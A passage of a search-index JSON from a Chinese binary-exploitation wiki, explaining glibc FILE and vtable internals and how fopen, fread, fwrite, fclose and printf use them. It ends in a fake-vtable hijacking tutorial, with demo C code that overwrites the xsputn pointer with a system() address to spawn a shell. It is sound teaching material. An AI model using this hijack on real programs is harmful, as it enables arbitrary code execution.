}\n}\n\n\n\n\u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002\n\nif (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap (\nnew_f-\nfp.file);\n\n\n\n\u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f\n\n\n\n\n\u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784\n\n\n\u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable\n\n\n\u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784\n\n\n\u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d\n\n\n\u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6\n\n\n\n\nfclose\n\n\nfclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002\n\n\nint fclose(FILE *stream)\n\n\n\u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a\n\n\nfclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe\n\n\nif (fp-\n_IO_file_flags \n _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);\n\n\n\n\n\u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6\n\n\nif (fp-\n_IO_file_flags \n _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);\n\n\n\n\n\u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784\n\n\n_IO_FINISH (fp);\n\n\n\n\nprintf/puts\n\n\nprintf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002\n\n\nputs\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002\n\n\nprintf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0\n\n\nvfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite", 
            "title": "FILE \u6587\u4ef6\u7ed3\u6784\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/introduction/#file", 
            "text": "", 
            "title": "FILE\u7ed3\u6784"
        }, 
        {
            "location": "/pwn/io_file/introduction/#file_1", 
            "text": "FILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002\nFILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002  FILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a  struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it s too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};  \u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002  \u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002  \u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f  _IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_  \u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002  \u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228  struct _IO_FILE_plus\n{\n    _IO_FILE    file;\n    IO_jump_t   *vtable;\n}  vtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488  void\u00a0*\u00a0funcs[]\u00a0=\u00a0{\n\u00a0\u00a0\u00a01\u00a0NULL,\u00a0//\u00a0 extra\u00a0word \n\u00a0\u00a0\u00a02\u00a0NULL,\u00a0//\u00a0DUMMY\n\u00a0\u00a0\u00a03\u00a0exit,\u00a0//\u00a0finish\n\u00a0\u00a0\u00a04\u00a0NULL,\u00a0//\u00a0overflow\n\u00a0\u00a0\u00a05\u00a0NULL,\u00a0//\u00a0underflow\n\u00a0\u00a0\u00a06\u00a0NULL,\u00a0//\u00a0uflow\n\u00a0\u00a0\u00a07\u00a0NULL,\u00a0//\u00a0pbackfail\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a08\u00a0NULL,\u00a0//\u00a0xsputn  #printf\n\u00a0\u00a0\u00a09\u00a0NULL,\u00a0//\u00a0xsgetn\n\u00a0\u00a0\u00a010\u00a0NULL,\u00a0//\u00a0seekoff\n\u00a0\u00a0\u00a011\u00a0NULL,\u00a0//\u00a0seekpos\n\u00a0\u00a0\u00a012\u00a0NULL,\u00a0//\u00a0setbuf\n\u00a0\u00a0\u00a013\u00a0NULL,\u00a0//\u00a0sync\n\u00a0\u00a0\u00a014\u00a0NULL,\u00a0//\u00a0doallocate\n\u00a0\u00a0\u00a015\u00a0NULL,\u00a0//\u00a0read\n\u00a0\u00a0\u00a016\u00a0NULL,\u00a0//\u00a0write\n\u00a0\u00a0\u00a017\u00a0NULL,\u00a0//\u00a0seek\n\u00a0\u00a0\u00a018\u00a0pwn,\u00a0\u00a0//\u00a0close\n\u00a0\u00a0\u00a019\u00a0NULL,\u00a0//\u00a0stat\n\u00a0\u00a0\u00a020\u00a0NULL,\u00a0//\u00a0showmanyc\n\u00a0\u00a0\u00a021\u00a0NULL,\u00a0//\u00a0imbue\n};", 
            "title": "FILE\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fread", 
            "text": "fread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;    buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002    size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002    count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002    stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002    \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570    fread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002  _IO_size_t\n_IO_fread (buf, size, count, fp)\n     void *buf;\n     _IO_size_t size;\n     _IO_size_t count;\n     _IO_FILE *fp;\n{\n  ...\n  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);\n  ...\n}  \u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002  _IO_size_t\n_IO_sgetn (fp, data, n)\n     _IO_FILE *fp;\n     void *data;\n     _IO_size_t n;\n{\n  return _IO_XSGETN (fp, data, n);\n}  \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c    if (fp- _IO_buf_base\n            want   (size_t) (fp- _IO_buf_end - fp- _IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)\n        break;\n\n          continue;\n        }", 
            "title": "fread"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fwrite", 
            "text": "fwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);    buffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740;    size:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570;    count:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570;    stream:\u76ee\u6807\u6587\u4ef6\u6307\u9488;    \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002    fwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002\n\u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002  \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002  written = _IO_sputn (fp, (const char *) buf, request);  \u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW   /* Next flush the (full) buffer. */\n      if (_IO_OVERFLOW (f, EOF) == EOF)  _IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow  if (ch == EOF)\n    return _IO_do_write (f, f- _IO_write_base,\n             f- _IO_write_ptr - f- _IO_write_base);\n  if (f- _IO_write_ptr == f- _IO_buf_end ) /* Buffer is really full */\n    if (_IO_do_flush (f) == EOF)\n      return EOF; \n\u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570", 
            "title": "fwrite"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fopen", 
            "text": "fopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b  FILE *fopen(char *filename, *type);    filename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84    type:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b    \u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488    \u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b  \u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684  *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS ( new_f- fp) =  _IO_file_jumps;\n_IO_file_init ( new_f- fp);  \u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d void\n_IO_link_in (fp)\n     struct _IO_FILE_plus *fp;\n{\n    if ((fp- file._flags   _IO_LINKED) == 0)\n    {\n      fp- file._flags |= _IO_LINKED;\n      fp- file._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n      ++_IO_list_all_stamp;\n    }\n}  \u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap ( new_f- fp.file);  \u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f   \u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784  \u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable  \u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784  \u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d  \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6", 
            "title": "fopen"
        }, 
        {
            "location": "/pwn/io_file/introduction/#fclose", 
            "text": "fclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002  int fclose(FILE *stream) \n\u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a  fclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe  if (fp- _IO_file_flags   _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);  \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6  if (fp- _IO_file_flags   _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);  \u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784  _IO_FINISH (fp);", 
            "title": "fclose"
        }, 
        {
            "location": "/pwn/io_file/introduction/#printfputs", 
            "text": "printf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002  puts\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002  printf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0  vfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite", 
            "title": "printf/puts"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/", 
            "text": "\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\n\n\n\u7b80\u4ecb\n\n\n\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002\n\n\n\u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002\n\n\n\u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002\n\n\n\u5b9e\u8df5\n\n\n\u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002\n\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen(\n123.txt\n,\nrw\n);\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n    printf(\ncall 0x41414141\n);\n}\n\n\n\n\n\u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002\n\n\n\u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002\n\n\n\u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982\n\n\n#define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen(\n123.txt\n,\nrw\n);\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    memcopy(fp,\nsh\n,3);\n\n    vtable_ptr[7]=system_ptr //xsputn\n\n\n    